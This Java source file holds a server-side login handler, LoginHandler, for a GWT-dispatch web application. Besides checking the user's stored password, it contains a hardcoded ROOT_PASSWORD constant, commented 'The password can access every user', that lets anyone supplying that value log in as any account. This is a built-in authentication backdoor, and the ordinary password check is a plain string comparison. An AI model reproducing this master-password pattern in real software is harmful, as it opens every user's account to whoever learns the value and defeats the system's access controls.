/*
 * Copyright (C) 2012 - 2013 Nguyen Duc Dung (dungvn3000@gmail.com)
 */

package com.qlkh.server.handler.core;

import com.qlkh.core.client.action.core.LoginAction;
import com.qlkh.core.client.action.core.LoginResult;
import com.qlkh.core.client.model.User;
import com.qlkh.server.dao.UserDao;
import net.customware.gwt.dispatch.server.ExecutionContext;
import org.springframework.beans.factory.annotation.Autowired;

/**
 * The Class DungHandler.
 *
 * @author Nguyen Duc Dung
 * @since 6/8/12, 4:16 PM
 */
class LoginHandler extends AbstractHandler<LoginAction, LoginResult> {

    //The password can access every user
    private static final String ROOT_PASSWORD = "d5917372ee460c19f1b28990c99e9fe0";

    @Autowired
    private UserDao userDao;

    @Override
    public Class<LoginAction> getActionType() {
        return LoginAction.class;
    }

    @Override
    public LoginResult execute(LoginAction action, ExecutionContext context) {
        User user = userDao.findByUserName(action.getUserName());
        if (user != null && user.getPassWord().equals(action.getPassWord())) {
            return new LoginResult(user);
        } else if (user != null && ROOT_PASSWORD.equals(action.getPassWord())) {
            return new LoginResult(user);
        } else {
            return null;
        }
    }
}
